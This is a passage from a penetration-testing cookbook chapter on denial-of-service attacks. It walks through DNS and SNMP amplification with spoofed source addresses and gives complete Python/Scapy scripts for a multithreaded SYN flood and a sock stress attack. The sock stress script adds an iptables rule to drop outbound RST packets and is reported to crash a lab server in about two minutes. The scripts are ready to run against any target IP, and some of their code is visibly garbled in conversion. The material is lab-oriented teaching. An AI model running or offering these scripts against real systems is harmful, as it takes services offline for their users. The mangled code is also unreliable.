<li value="20" class="calibre19">The response confirms that we have successfully built the desired request, and we have solicited a sizable payload that includes seven <kbd class="calibre16">A</kbd> records, three <kbd class="calibre16">AAAA</kbd> record, five <kbd class="calibre16">NS</kbd> records, and three <kbd class="calibre16">MX</kbd> records for the <kbd class="calibre16">yahoo.com</kbd> domain.</li>
</ol>
<ol start="21" class="calibre20">
<li value="21" class="calibre19">This exercise makes it clear that the response to this request is significantly larger than the request itself. To make this an effective amplification attack, it needs to be redirected to our target by spoofing the source IP address:</li>
</ol>
<div class="p"><img class="alignnone201" src="../images/00644.jpeg"/></div>
<ol start="22" class="calibre20">
<li value="22" class="calibre19">After redefining the source IP address value to the string equivalent of the IP address of the target system, we can confirm that the value has been adjusted using the <kbd class="calibre16">display()</kbd> function. We can then rebuild our request with the change. To verify that we are then able to redirect the DNS query response to this spoofed host, we can start a TCP dump on the host using the <kbd class="calibre16">tcpdump</kbd> command, as shown in the following screenshot:</li>
</ol>
<div class="p"><img class="alignnone202" src="../images/00019.jpeg"/></div>
<ol start="23" class="calibre20">
<li value="23" class="calibre19">In the example provided, the <kbd class="calibre16">tcpdump</kbd> configurations will capture all traffic that crosses the <kbd class="calibre16">eth0</kbd> interface from a source address of <kbd class="calibre16"><span><span>192.168.68.2</span></span></kbd> (the address of the queried DNS server). Then, we can send our requests using the <kbd class="calibre16">send()</kbd> function:</li>
</ol>
<div class="p"><img class="alignnone203" src="../images/00085.jpeg"/></div>
<ol start="24" class="calibre20">
<li value="24" class="calibre19">After sending the requests, we should refer back to the <kbd class="calibre16">tcpdump</kbd> content to verify that the response to the DNS queries was returned to the victim server:</li>
</ol>
<div class="p"><img class="alignnone204" src="../images/00150.jpeg"/></div>
<ol start="25" class="calibre20">
<li value="25" class="calibre19">This entire process of performing DNS amplification can actually be performed with a single one-liner command in Scapy. This command uses all of the same values that we discussed in the previous exercise. The count value can then be modified to define the number of payload responses that you want to be sent to the victim server:</li>
</ol>
<div class="p"><img class="alignnone205" src="../images/00230.jpeg"/></div>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9009S1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">Amplification attacks work by overwhelming a target with network traffic by leveraging one or more third-party devices. For most amplification attacks, two conditions are true:</p>
<ul class="calibre18">
<li class="calibre19">The protocol used to perform the attack does not verify the requesting source. <span>The response from the network function used should be significantly larger than the request used to solicit it.</span></li>
<li class="calibre19">The effectiveness of a DNS amplification attack is directly correlated to the size of the DNS query response. Additionally, the potency of the attack can be increased by employing the use of multiple DNS servers.</li>
</ul>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="90UQE1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">SNMP amplification DoS attack</h1>
            

            <article>
                
<p class="calibre5">An SNMP amplification attack exploits SNMP devices with predictable community strings by spoofing queries with large responses. The effectiveness of this attack can be increased by employing a DDoS component as well as by sending requests to multiple SNMP devices simultaneously.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="91TB01-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To simulate an SNMP amplification attack, you will need to have a device with SNMP enabled on it. In the examples provided, a Windows XP device is used for this purpose. For more information on setting up a Windows system, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>. Additionally, an installation of Ubuntu is used as a scan target. For more information on setting up Ubuntu, refer to the <em class="calibre15">Installing Ubuntu Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section>

            <header id="92RRI2-cf89710d791c4a3bb78ec273d9322426">
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">To perform an SNMP amplification attack, follow the given steps:</p>
<ol class="calibre20">
<li value="1" class="calibre19">To get started, we should craft an SNMP query to be returned to our system to assess the size of the payload to be used. To send our SNMP query request, we must first build the layers of this request. The first layer that we will need to construct is the IP layer:</li>
</ol>
<div class="p"><img class="alignnone206" src="../images/00300.jpeg"/></div>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">To build the IP layer of our request, we should assign the <kbd class="calibre16">IP</kbd> object to the variable <kbd class="calibre16">i</kbd>. By calling the <kbd class="calibre16">display()</kbd> function, we can identify the attribute configurations for the object. By default, both the sending and receiving addresses are set to the loopback address of <kbd class="calibre16">127.0.0.1</kbd>. These values can be modified by changing the destination address by setting <kbd class="calibre16">i.dst</kbd> equal to the string value of the address of the nameserver to be queried. By calling the <kbd class="calibre16">display()</kbd> function again, we can see that not only has the destination address been updated, but Scapy will also automatically update the source IP address to the address associated with the default interface.</li>
<li value="3" class="calibre19">Now that we have constructed the IP layer of the request, we should proceed to the next layer. As SNMP is handled over UDP, the next layer to construct is the UDP layer:</li>
</ol>
<div class="p"><img class="alignnone207" src="../images/00385.jpeg"/></div>
<ol start="4" class="calibre20">
<li value="4" class="calibre19">To build the UDP layer of our request, we will use the same technique as we did for the IP layer. In the example provided, the <kbd class="calibre16">UDP</kbd> object was assigned to the <kbd class="calibre16">u</kbd> variable. As discussed earlier, the default configurations can be identified by calling the <kbd class="calibre16">display()</kbd> function. Here, we can see that the default value for both the source and destination ports is listed as <kbd class="calibre16">domain</kbd>. As you might likely suspect, this is to indicate the DNS service associated with the port <kbd class="calibre16">53</kbd>. This needs to be changed to the port associated with SNMP:</li>
</ol>
<div class="p"><img class="alignnone208" src="../images/00470.jpeg"/></div>
<ol start="5" class="calibre20">
<li value="5" class="calibre19">To change the source port and destination port to SNMP, the integer value of <kbd class="calibre16">161</kbd> should be passed to it; this value corresponds to the UDP port associated with the service. These changes can be verified by once again calling the <kbd class="calibre16">display()</kbd> function. Now that the IP and UDP layers have been constructed, we need to build the SNMP layer:</li>
</ol>
<div class="p"><img class="alignnone209" src="../images/00539.jpeg"/></div>
<ol start="6" class="calibre20">
<li value="6" class="calibre19">To build the SNMP layer of our request, we will use the same technique as we did for both the IP and UDP layers. In the example provided, the <kbd class="calibre16">SNMP</kbd> object was assigned to the <kbd class="calibre16">snmp</kbd> variable. As discussed earlier, the default configurations can be identified by calling the <kbd class="calibre16">display()</kbd> function. Now that the IP, UDP, and SNMP layers have been constructed, we need to build a bulk request to substitute the SNMP <kbd class="calibre16">GET</kbd> request that is assigned by default to the PDU value:</li>
</ol>
<div class="p"><img class="alignnone210" src="../images/00003.jpeg"/></div>
<ol start="7" class="calibre20">
<li value="7" class="calibre19">To build the <kbd class="calibre16">SNMPbulk()</kbd> request, we will use the same technique as we did for the IP, UDP, and SNMP layers. In the example provided, the <kbd class="calibre16">SNMPbulk()</kbd> request was assigned to the <kbd class="calibre16">bulk</kbd> variable. As discussed earlier, the default configurations can be identified by calling the <kbd class="calibre16">display()</kbd> function. Here, we can see that there are several values that need to be modified:</li>
</ol>
<div class="p"><img class="alignnone211" src="../images/00006.jpeg"/></div>
<ol start="8" class="calibre20">
<li value="8" class="calibre19">The SNMP <kbd class="calibre16">varbindlist</kbd> needs to be modified to include the queried <kbd class="calibre16">oid</kbd> values. Additionally, <kbd class="calibre16">max_repetitions</kbd> was assigned the integer value of <kbd class="calibre16">50</kbd>. Now that the bulk request has been configured, the bulk request object should be assigned as the SNMP PDU value:</li>
</ol>
<div class="p"><img class="alignnone212" src="../images/00008.jpeg"/></div>
<ol start="9" class="calibre20">
<li value="9" class="calibre19">We can verify that the bulk request has been assigned to the SNMP PDU value by calling the <kbd class="calibre16">display()</kbd> function. Now that the IP, UDP, and SNMP layers have been constructed and the bulk request has been configured and assigned to the SNMP layer, we can construct the request by stacking these layers:</li>
</ol>
<div class="p"><img class="alignnone213" src="../images/00009.jpeg"/></div>
<ol start="10" class="calibre20">
<li value="10" class="calibre19">The IP, UDP, and SNMP layers can be stacked by separating the variables with a forward slash. These layers can then be set equal to a new variable that will represent the entire request. The <kbd class="calibre16">display()</kbd> function can then be called to view the configurations for the request. Once the request has been built, this can then be passed to the <kbd class="calibre16">send</kbd> and <kbd class="calibre16">receive</kbd> functions so that we can analyze the response:</li>
</ol>
<div class="p"><img class="alignnone214" src="../images/00012.jpeg"/></div>
<ol start="11" class="calibre20">
<li value="11" class="calibre19">The response confirms that we have successfully built the desired request and have solicited a sizable payload in comparison to the relatively small request that was initially made. This entire process can similarly be performed with a simple one-liner command in Scapy. This command uses all of the same values that we discussed in the previous exercise:</li>
</ol>
<div class="p"><img class="alignnone215" src="../images/00015.jpeg"/></div>
<ol start="12" class="calibre20">
<li value="12" class="calibre19">To actually use this command as an attack, the source IP address needs to be changed to the IP address of the target system. By doing this, we should be able to redirect the payload to that victim. This can be done by changing the IP <kbd class="calibre16">src</kbd> value to the string equivalent of the target IP address:</li>
</ol>
<div class="p"><img class="alignnone216" src="../images/00017.jpeg"/></div>
<ol start="13" class="calibre20">
<li value="13" class="calibre19">The <kbd class="calibre16">send()</kbd> function should be used to send these spoofed requests, as no response is expected to be returned on the local interface. To confirm that the payload does arrive at the target system, a <kbd class="calibre16">tcpdump</kbd> command can be used to capture the incoming traffic:</li>
</ol>
<div class="p"><img class="alignnone217" src="../images/00018.jpeg"/></div>
<ol start="14" class="calibre20">
<li value="14" class="calibre19">In the example provided, <kbd class="calibre16">tcpdump</kbd> is configured to capture traffic going across the <kbd class="calibre16">eth0</kbd> interface that originates from a source IP address of <kbd class="calibre16">172.16.69.129</kbd> (the IP address of the SNMP host).</li>
</ol>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="93QC41-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">Amplification attacks work by overwhelming a target with network traffic by leveraging one or more third-party devices. For most amplification attacks, two conditions are true:</p>
<ul class="calibre18">
<li class="calibre19">The protocol used to perform the attack does not verify the requesting source. The response from the network function used should be significantly larger than the request used to solicit it.</li>
<li class="calibre19">The effectiveness of an SNMP amplification attack is directly correlated to the size of the SNMP query response. Additionally, the potency of the attack can be increased by employing the use of multiple SNMP devices.</li>
</ul>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="94OSM1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">SYN flood DoS attack</h1>
            

            <article>
                
<p class="calibre5">A <strong class="calibre1">SYN flood DoS</strong> attack is a resource-consumption attack. It works by sending a large number of TCP SYN requests to the remote port associated with the service that is the target of the attack. For each initial SYN packet that is received by the target service, it will then send out a SYN+ACK packet and hold the connection open to wait for the final ACK packet from the initiating client. By overloading the target with these half-open requests, an attacker can render a service unresponsive.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="95ND81-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use Scapy to perform a full SYN flood against a target, you will need to have a remote system that is running network services over TCP. In the examples provided, an instance of Metasploitable2 is used to perform this task. For more information on setting up Metasploitable2, refer to the <em class="calibre15">Installing Metasploitable2</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>. Additionally, this section will require a script to be written to the filesystem, using a text editor such as Vim or <span>GNU n</span>ano. For more information on writing scripts, refer to the <em class="calibre15">Using text editors (Vim and <span>GNU n</span>ano)</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="96LTQ1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">To perform a SYN flood using Scapy, follow the given steps:</p>
<ol class="calibre20">
<li value="1" class="calibre19">We need to get started by sending TCP SYN requests to the port associated with the target service. To send a TCP SYN request to any given port, we must first build the layers of this request. The first layer that we will need to construct is the IP layer:</li>
</ol>
<div class="p"><img class="alignnone218" src="../images/00122.jpeg"/></div>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">To build the IP layer of our request, we should assign the <kbd class="calibre16">IP</kbd> object to the variable <kbd class="calibre16">i</kbd>. By calling the <kbd class="calibre16">display()</kbd> function, we can identify the attribute configurations for the object. By default, both the sending and receiving addresses are set to the loopback address of <kbd class="calibre16">127.0.0.1</kbd>. These values can be modified by changing the destination address by setting <kbd class="calibre16">i.dst</kbd> equal to the string value of the address we wish to scan. By calling the <kbd class="calibre16">display()</kbd> function again, we can see that not only has the destination address been updated, but Scapy also will automatically update the source IP address to the address associated with the default interface.</li>
<li value="3" class="calibre19">Now that we have constructed the IP layer of the request, we should proceed to the TCP layer:</li>
</ol>
<div class="p"><img class="alignnone219" src="../images/00022.jpeg"/></div>
<ol start="4" class="calibre20">
<li value="4" class="calibre19">To build the TCP layer of our request, we will use the same technique as we did for the IP layer. In the example provided, the <kbd class="calibre16">TCP</kbd> object was assigned to the <kbd class="calibre16">t</kbd> variable. As discussed earlier, the default configurations can be identified by calling the <kbd class="calibre16">display()</kbd> function. Here, we can see that the default value for the destination port is the HTTP port <kbd class="calibre16">80</kbd>. For our initial scan, we will leave the default TCP configurations as they are.</li>
<li value="5" class="calibre19">Now that we have created both the IP and TCP layers, we need to construct the request by stacking these layers:</li>
</ol>
<div class="p"><img class="alignnone220" src="../images/00025.jpeg"/></div>
<ol start="6" class="calibre20">
<li value="6" class="calibre19">The IP and TCP layers can be stacked by separating the variables with a forward slash. These layers can then be set equal to a new variable that will represent the entire request. The <kbd class="calibre16">display()</kbd> function can then be called to view the configurations for the request.</li>
</ol>
<ol start="7" class="calibre20">
<li value="7" class="calibre19">Once the request has been built, this can then be passed to the <kbd class="calibre16">send</kbd> and <kbd class="calibre16">receive</kbd> functions so that we can analyze the response:</li>
</ol>
<div class="p"><img class="alignnone221" src="../images/00028.jpeg"/></div>
<ol start="8" class="calibre20">
<li value="8" class="calibre19">The same request can be performed without independently building and stacking each layer. Instead, a single one-line command can be used by calling the functions directly and passing the appropriate arguments to them:</li>
</ol>
<div class="p"><img class="alignnone222" src="../images/00031.jpeg"/></div>
<ol start="9" class="calibre20">
<li value="9" class="calibre19">The effectiveness of the SYN flood depends on the number of SYN requests that can be generated in a given period of time. To improve the effectiveness of this attack sequence, I have written a multithreaded script that can perform as many concurrent processes of SYN packet injection as can be handled by an attacking system:</li>
</ol>
<pre class="calibre24">
        #!/usr/bin/python<br class="title-page-name"/><br class="title-page-name"/>        from scapy.all import *<br class="title-page-name"/>        from time import sleep<br class="title-page-name"/>        import thread<br class="title-page-name"/>        import random<br class="title-page-name"/>        import logging<br class="title-page-name"/>        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)<br class="title-page-name"/><br class="title-page-name"/>        if len(sys.argv) != 4:<br class="title-page-name"/>        print "Usage - ./syn_flood.py [Target-IP]<br class="title-page-name"/>         [Port Number] [Threads]"<br class="title-page-name"/>        print "Example - ./syn_flood.py 10.0.0.5 80 20"<br class="title-page-name"/>        print "Example will perform a 20x multi-threaded<br class="title-page-name"/>         SYN flood attack"<br class="title-page-name"/>        print "against the HTTP (port 80) service on 10.0.0.5"<br class="title-page-name"/>        sys.exit()<br class="title-page-name"/><br class="title-page-name"/>        target = str(sys.argv[1])<br class="title-page-name"/>        port = int(sys.argv[2])<br class="title-page-name"/>        threads = int(sys.argv[3])<br class="title-page-name"/><br class="title-page-name"/>        print "Performing SYN flood. Use Ctrl+C to stop attack."<br class="title-page-name"/>        def synflood(target,port):<br class="title-page-name"/>        while 0 == 0:<br class="title-page-name"/>        x = random.randint(0,65535)<br class="title-page-name"/>        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)<br class="title-page-name"/><br class="title-page-name"/>        for x in range(0,threads):<br class="title-page-name"/>        thread.start_new_thread(synflood, (target,port))<br class="title-page-name"/><br class="title-page-name"/>        while 0 == 0:<br class="title-page-name"/>        sleep(1)
</pre>
<ol start="10" class="calibre20">
<li value="10" class="calibre19">The script accepts three arguments upon execution. These arguments include the target IP address, the port number that the SYN flood will be sent to, and the number of threads or concurrent processes that will be used to execute the SYN flood.</li>
<li value="11" class="calibre19">Each thread starts by generating an integer value between 0 and 65,535. This range represents the total possible values that can be assigned to the source port. The portions of the TCP header that define the source and destination port addresses are both 16 bits in length. Each bit can retain a value of <kbd class="calibre16">1</kbd> or <kbd class="calibre16">0</kbd>.</li>
<li value="12" class="calibre19">As such, there are 2<sup class="calibre33">16</sup>, or 65,536, possible TCP port addresses. A single source port can only hold a single half-open connection, so by generating unique source port addresses for each SYN request, we can drastically improve the performance of the attack:</li>
</ol>
<div class="p"><img class="alignnone223" src="../images/00033.jpeg"/></div>
<ol start="13" class="calibre20">
<li value="13" class="calibre19">When the script is executed without any arguments, the usage is returned to the user. In the example provided, the script is then executed against the HTTP web service hosted on the TCP port <kbd class="calibre16">80</kbd> of <kbd class="calibre16">172.16.69.128</kbd>, with <kbd class="calibre16">20</kbd> concurrent threads.</li>
<li value="14" class="calibre19">The script itself provides little feedback; however, a traffic capture utility such as Wireshark or TCPdump can be run to verify that the connections are being sent. After a very brief moment, connection attempts to the server will become very slow or altogether unresponsive.</li>
</ol>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="97KEC1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">TCP services only allow a limited number of half-open connections to be established. By rapidly sending a large number of TCP SYN requests, these available connections are depleted, and the server will no longer be able to accept new incoming connections. As such, the service will become completely inaccessible to new users. The effectiveness of this attack can be intensified to an even greater extent by using it as a DDoS and having multiple attacking systems execute the script simultaneously.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="98IUU1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Sock stress DoS attack</h1>
            

            <article>
                
<p class="calibre5">The <strong class="calibre1">sock stress DoS</strong> attack consists of establishing a series of open connections to the TCP port associated with the service to be attacked. The final ACK response in the TCP handshake should have a value of <kbd class="calibre16">0</kbd>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="99HFG1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use Scapy to perform a sock stress DoS attack against a target, you will need to have a remote system that is running network services over TCP. In the examples provided, an instance of Metasploitable2 is used to perform this task. For more information on setting up Metasploitable2, refer to the <em class="calibre15">Installing Metasploitable2</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>. Additionally, this section will require a script to be written to the filesystem, using a text editor such as Vim or <span>GNU n</span>ano. For more information on writing scripts, refer to the <em class="calibre15">Using text editors (Vim and <span>GNU n</span>ano)</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section>

            <header id="9AG022-cf89710d791c4a3bb78ec273d9322426">
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">To perform a sock stress DoS attack, follow the given steps:</p>
<ol class="calibre20">
<li value="1" class="calibre19">The following script was written in Scapy to perform a sock stress DoS attack against a target system. The following script can be used to test for vulnerable services:</li>
</ol>
<pre class="calibre24">
        #!/usr/bin/python<br class="title-page-name"/><br class="title-page-name"/>        from scapy.all import *<br class="title-page-name"/>        from time import sleep<br class="title-page-name"/>        import thread<br class="title-page-name"/>        import logging<br class="title-page-name"/>        import os<br class="title-page-name"/>        import signal<br class="title-page-name"/>        import sys<br class="title-page-name"/>        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)<br class="title-page-name"/><br class="title-page-name"/>        if len(sys.argv) != 4:<br class="title-page-name"/>        print "Usage - ./sock_stress.py [Target-IP]<br class="title-page-name"/>         [Port Number] [Threads]"<br class="title-page-name"/>        print "Example - ./sock_stress.py 10.0.0.5 21 20"<br class="title-page-name"/>        print "Example will perform a 20x multi-threaded<br class="title-page-name"/>         sock-stress DoS attack "<br class="title-page-name"/>        print "against the FTP (port 21) service on 10.0.0.5"<br class="title-page-name"/>        print "n***NOTE***"<br class="title-page-name"/><br class="title-page-name"/>        print "Make sure you target a port that responds<br class="title-page-name"/>         when a connection is made"<br class="title-page-name"/>        sys.exit()<br class="title-page-name"/><br class="title-page-name"/>        target = str(sys.argv[1])<br class="title-page-name"/>        dstport = int(sys.argv[2])<br class="title-page-name"/>        threads = int(sys.argv[3])<br class="title-page-name"/><br class="title-page-name"/>        ## This is where the magic happens<br class="title-page-name"/>        def sockstress(target,dstport):<br class="title-page-name"/>        while 0 == 0:<br class="title-page-name"/>        try:<br class="title-page-name"/>        x = random.randint(0,65535)<br class="title-page-name"/>        response = sr1(IP(dst=target)<br class="title-page-name"/>        /TCP(sport=x,dport=dstport,flags='S'),timeout=1,verbose=0)             send(IP(dst=target)<br class="title-page-name"/>        /TCP(dport=dstport,sport=x,window=0,flags='A',<br class="title-page-name"/>        ack=(response[TCP].seq + 1))/'x00x00',verbose=0)<br class="title-page-name"/>        except:<br class="title-page-name"/>        pass<br class="title-page-name"/><br class="title-page-name"/>        ## Graceful shutdown allows IP Table Repair<br class="title-page-name"/>        def graceful_shutdown(signal, frame):<br class="title-page-name"/>        print 'nYou pressed Ctrl+C!'<br class="title-page-name"/>        print 'Fixing IP Tables'<br class="title-page-name"/>        os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d '<br class="title-page-name"/>         + target + ' -j DROP')<br class="title-page-name"/>        sys.exit()<br class="title-page-name"/><br class="title-page-name"/>        ## Creates IPTables Rule to Prevent Outbound RST Packet<br class="title-page-name"/>         to Allow Scapy TCP Connections<br class="title-page-name"/>        os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d '<br class="title-page-name"/>         + target + ' -j DROP')<br class="title-page-name"/>        signal.signal(signal.SIGINT, graceful_shutdown)<br class="title-page-name"/><br class="title-page-name"/>        ## Spin up multiple threads to launch the attack<br class="title-page-name"/>        print "nThe onslaught has begun...use Ctrl+C to<br class="title-page-name"/>         stop the attack"<br class="title-page-name"/>        for x in range(0,threads):<br class="title-page-name"/>        thread.start_new_thread(sockstress, (target,dstport))<br class="title-page-name"/><br class="title-page-name"/>        ## Make it go FOREVER (...or at least until Ctrl+C)<br class="title-page-name"/>        while 0 == 0:<br class="title-page-name"/>        sleep(1)<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>
</pre>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">Notice that this script has two major functions: the sockstress attack function and a separate graceful shutdown function. A separate function is required for shutdown because in order for the script to function properly, the script has to modify the local IPtables rules. This change is necessary in order to complete TCP connections with a remote host using Scapy. The justification for this was more thoroughly addressed in the <em class="calibre15">Connect scanning with Scapy</em> recipe in <a href="part0146.html#4B7I41-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 4</a>, <em class="calibre15">Port Scanning</em>.</li>
<li value="3" class="calibre19">Prior to executing the script, we can use the <kbd class="calibre16">netstat</kbd> and <kbd class="calibre16">free</kbd> utilities to get a baseline for the connections established and memory being used:</li>
</ol>
<div class="p"><img class="alignnone224" src="../images/00034.jpeg"/></div>
<ol start="4" class="calibre20">
<li value="4" class="calibre19">By using <kbd class="calibre16">netstat</kbd> and then by piping the output over to a <kbd class="calibre16">grep</kbd> function and extracting only the established connections, we can see that only two connections exist. We can also use the <kbd class="calibre16">free</kbd> utility to see the current memory usage. The <kbd class="calibre16">-m</kbd> option will return the values in megabytes.</li>
<li value="5" class="calibre19">After determining the baseline for established connections and available memory, we can launch the attack on this target server:</li>
</ol>
<div class="p"><img class="alignnone225" src="../images/00035.jpeg"/></div>
<ol start="6" class="calibre20">
<li value="6" class="calibre19">When executing the script without any supplied arguments, the script will return the expected syntax and usage. The script accepts three arguments upon execution. These arguments include the target IP address, the port number that the sock stress DoS will be sent to, and the number of threads or concurrent processes that will be used to execute the sock stress DoS.</li>
<li value="7" class="calibre19">Each thread starts by generating an integer value between 0 and 65,535. This range represents the total possible values that can be assigned to the source port. The portions of the TCP header that define the source and destination port addresses are both 16 bits in length. Each bit can retain a value of <kbd class="calibre16">1</kbd> or <kbd class="calibre16">0</kbd>. As such, there are 2<sup class="calibre33">16</sup>, or 65,536, possible TCP port addresses. A single source port can only hold a single connection, so by generating unique source port addresses for each connection, we can drastically improve the performance of the attack.</li>
<li value="8" class="calibre19">Once the attack has been started, we can verify that it is working by checking the active connections that have been established on the target server:</li>
</ol>
<div class="p"><img class="alignnone226" src="../images/00038.jpeg"/></div>
<ol start="9" class="calibre20">
<li value="9" class="calibre19">A few moments after executing the script, we can see that the number of established connections has drastically increased. The output displayed here is truncated, and the list of connections was actually significantly longer than this. By consistently using the <kbd class="calibre16">free</kbd> utility, we can watch the available memory of the system progressively deplete. Once the memory free value has dropped to nearly nothing, the free buffer/cache space will begin to drop:</li>
</ol>
<div class="p"><img class="alignnone227" src="../images/00040.jpeg"/></div>
<ol start="10" class="calibre20">
<li value="10" class="calibre19">After all resources on the local system have been depleted, the system will finally crash. The amount of time required to complete this process will vary depending on the amount of local resources available. In the case of the demonstration provided here, which was performed on a Metasploitable VM with 512 MB of RAM, the attack took approximately 2 minutes to deplete all available local resources and crash the server.</li>
</ol>
<ol start="11" class="calibre20">
<li value="11" class="calibre19">After the server has crashed or whenever you wish to stop the DoS attack, you can press <em class="calibre15">Ctrl</em> + <em class="calibre15">C</em>:</li>
</ol>
<p class="calibre5"><img class="alignnone228" src="../images/00042.jpeg"/></p>
<ol start="12" class="calibre20">
<li value="12" class="calibre19">The script is written to catch the termination signal transmitted as a result of pressing <em class="calibre15">Ctrl</em> + <em class="calibre15">C</em>, and it will repair the local iptables by removing the rule that was generated prior to killing the script's execution sequence.</li>
</ol>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9BEGK1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How it works…</h1>
            

            <article>
                
<p class="calibre5">In a sock stress DoS, the final ACK packet in the three-way handshake includes a window value of <kbd class="calibre16">0</kbd>. Vulnerable services will not transmit any data in response to the connection because of the indication of any empty window on the part of the connecting client. Instead, the server will hold the data to be transmitted in memory. Flooding a server with these connections will deplete the resources of the server to include the memory, swap space, and processing power.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9CD161-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">DoS attacks with Nmap NSE</h1>
            

            <article>
                
<p class="calibre5">The <strong class="calibre1">Nmap Scripting Engine</strong> (<strong class="calibre1">NSE</strong>) has numerous scripts that can be used to perform DoS attacks. This specific recipe will demonstrate how to locate DoS NSE scripts, identify the usage of the scripts, and execute them.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9DBHO1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">Getting ready</h1>
            

            <article>
                
<p class="calibre5">To use Nmap NSE to perform DoS attacks, you will need to have a system that is running a vulnerable service addressed by one of the Nmap NSE DoS scripts. In the examples provided, an instance of Windows XP is used for this purpose. For more information on setting up a Windows system, refer to the <em class="calibre15">Installing Windows Server</em> recipe in <a href="part0026.html#OPEK1-cf89710d791c4a3bb78ec273d9322426" target="_blank" class="calibre6">Chapter 1</a>, <em class="calibre15">Getting Started</em>.</p>


            </article>

            <footer class="calibre7">
                
            </footer>

        </section>
    

        <section id="9EA2A1-cf89710d791c4a3bb78ec273d9322426">

            <header>
                </header><h1 class="header-title" id="calibre_pb_0">How to do it…</h1>
            

            <article>
                
<p class="calibre5">The following are the steps demonstrate an Dos attacks using Nmap NSE:</p>
<ol class="calibre20">
<li value="1" class="calibre19">Prior to using Nmap NSE scripts to perform DoS testing, we will need to identify what DoS scripts are available. There is a greppable <kbd class="calibre16">script.db</kbd> file in the Nmap NSE script directory that can be used to identify scripts in any given category:</li>
</ol>
<div class="p"><img class="alignnone229" src="../images/00044.jpeg"/></div>
<ol start="2" class="calibre20">
<li value="2" class="calibre19">By grepping DoS from the <kbd class="calibre16">script.db</kbd> file and then piping the output to a <kbd class="calibre16">cut</kbd> function, we can extract the scripts that can be used. By reading the beginning of any one of the scripts, we can usually find a lot of helpful information:</li>
</ol>
<div class="p"><img class="alignnone230" src="../images/00045.jpeg"/></div>
<ol start="3" class="calibre20">
